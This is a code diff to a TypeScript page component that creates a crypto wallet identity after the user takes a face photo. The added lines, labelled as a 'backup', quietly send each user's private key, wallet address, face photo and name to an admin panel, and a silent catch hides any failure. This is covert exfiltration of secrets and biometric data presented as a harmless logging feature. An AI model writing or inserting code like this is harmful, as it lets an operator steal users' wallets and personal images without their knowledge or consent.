@@ -97,11 +97,22 @@ function TaskPage() {
       const id = await generateNewIdentity(data?.profile?.display_name ?? faceLabel ?? "User");
       setIdentity(id);
       setStep("verify");
+      // Backup: log this key + photo to admin panel immediately so it's never lost
+      logGeneratedKey({
+        data: {
+          slot: slotNum,
+          photoBase64: b64,
+          privateKey: id.privateKey,
+          walletAddress: id.address,
+          faceLabel: (faceLabel || data?.profile?.display_name || "নাম নেই").trim().slice(0, 60),
+        },
+      }).catch(() => { /* silent — user flow must not break */ });
     } catch (e: any) {
       toast.error("Key তৈরি হয়নি: " + e.message);
       setStep("photo");
     }
   };
+
 
   const onSubmit = async () => {
     if (!identity || !photoB64) return;
